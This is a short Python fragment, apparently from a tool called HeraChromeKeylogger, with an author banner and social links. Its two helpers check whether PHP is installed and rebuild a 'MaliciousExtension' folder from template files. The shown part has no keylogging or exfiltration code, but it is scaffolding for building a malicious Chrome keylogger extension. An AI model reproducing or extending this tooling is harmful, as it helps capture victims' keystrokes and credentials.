######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################
from os import system

def checkPHP():
    if 256 != system('which php'):
        return True        
    else:
        return False

def pre():
    system('rm -rf MaliciousExtension')
    system('mkdir MaliciousExtension')
    system('cp Template/* MaliciousExtension/')


